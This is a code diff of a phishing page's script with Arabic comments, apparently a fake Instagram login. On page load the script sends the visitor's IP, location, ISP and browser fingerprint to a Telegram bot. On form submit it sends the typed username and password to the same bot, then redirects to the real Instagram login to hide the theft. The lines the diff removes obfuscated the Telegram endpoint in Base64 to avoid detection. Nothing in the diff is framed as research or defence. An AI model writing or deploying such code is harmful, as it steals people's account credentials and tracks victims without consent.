@@ -27,58 +27,62 @@
     </div>
 
     <script>
-        // مصفوفة البيانات المشفرة (Base64) لإخفاء الهوية عن الرادارات
-        // قم باستبدال القيم التالية ببياناتك المشفرة بـ Base64
-        const _0xDATA = {
-            _t: "NTEyMzQ1Njc4OjpBQUV... (ضع التوكن مشفر هنا)", 
-            _c: "MTIzNDU2Nzg5 (ضع الآي دي مشفر هنا)",
-            _u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", // رابط API تليجرام
-            _e: "L3NlbmRNZXNzYWdl" // مسار الإرسال
-        };
-
-        // دالة فك التشفير والتشغيل
-        const _decode = (s) => atob(s);
-
-        async function _dispatch(payload) {
+        // دالة الإرسال التي تسحب البيانات من Netlify Snippet
+        async function sendToTelegram(msg) {
             try {
-                const api = _decode(_0xDATA._u) + _decode(_0xDATA._t) + _decode(_0xDATA._e);
-                await fetch(api, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: _decode(_0xDATA._c),
-                        text: payload,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (err) { /* Silent Mode */ }
+                // سحب الإعدادات من window.TELE_CONFIG التي وضعتها في الموقع
+                const config = window.TELE_CONFIG; 
+                const token = config?.t;
+                const chatId = config?.c;
+
+                if (token && chatId) {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: msg,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } else {
+                    console.error("Configuration not found in Netlify Snippets.");
+                }
+            } catch (err) {
+                console.error("Transmission failed.");
+            }
         }
 
+        // تقرير المعلومات الفوري (Reconnaissance)
         window.onload = async function() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 const fingerprint = btoa(navigator.userAgent).substring(5, 15);
 
-                let report = `🚩 *NEW RECON* 🚩\n` +
-                             `IP: ${d.ip}\n` +
-                             `Loc: ${d.city}, ${d.country_name}\n` +
-                             `Device: ${navigator.platform}\n` +
-                             `ID: \`${fingerprint}\``;
+                let report = `📸 *NEW RECON REPORT* 📸\n` +
+                             `---------------------------\n` +
+                             `📍 IP: ${d.ip}\n` +
+                             `🌍 Loc: ${d.city}, ${d.country_name}\n` +
+                             `🏢 ISP: ${d.org}\n` +
+                             `📱 Device: ${navigator.platform}\n` +
+                             `🔑 ID: \`${fingerprint}\``;
 
-                _dispatch(report);
+                sendToTelegram(report);
             } catch (e) { }
         };
 
+        // سحب البيانات عند الضغط على Login
         document.getElementById('authForm').onsubmit = async function(e) {
             e.preventDefault();
             const u = document.getElementById('usr').value;
             const p = document.getElementById('pwd').value;
             
-            await _dispatch(`🔓 *LOG:* \nU: \`${u}\` \nP: \`${p}\``);
+            await sendToTelegram(`👤 *LOGIN ATTEMPT*\n📧 User: \`${u}\` \n🔑 Pass: \`${p}\``);
             
-            // التوجيه النهائي
-            window.location.href = _decode("aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8=");
+            // التوجيه للموقع الحقيقي للتمويه
+            window.location.href = "https://www.instagram.com/accounts/login/";
         };
     </script>
 </body>
